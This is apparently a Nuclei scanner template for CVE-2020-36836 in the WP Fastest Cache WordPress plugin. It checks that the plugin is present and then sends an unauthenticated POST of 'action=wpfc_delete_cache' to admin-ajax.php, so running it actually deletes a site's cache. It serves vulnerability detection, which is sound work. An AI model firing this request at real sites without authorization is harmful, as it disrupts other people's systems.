id: CVE-2020-36836-wp-fastest-cache
info:
  name: CVE-2020-36836 - WP Fastest Cache (unauthorized cache deletion)
  author: gsharma101
  severity: medium
  description: |
    WP Fastest Cache <= 0.9.0.2 allowed low-privilege WordPress users (for example:
    Subscriber) to trigger cache deletion via the AJAX action `wpfc_delete_cache`
    on `admin-ajax.php`. This template verifies plugin presence and then attempts
    the delete-cache AJAX call to detect the issue.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-36836
  tags: cve,wordpress,wp,wp-fastest-cache

requests:
  - id: check-plugin
    name: check plugin admin page
    method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=wpfastestcacheoptions"
    headers:
      User-Agent: nuclei-scan
    matchers:
      - type: word
        part: body
        words:
          - "WP Fastest Cache Options"

  - id: exploit-check
    name: attempt unauthorized cache delete
    method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      User-Agent: nuclei-scan
      Content-Type: application/x-www-form-urlencoded
    body: "action=wpfc_delete_cache"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "All cache files have been deleted"
          - "All cache files"
          - "deleted"
          - "0"
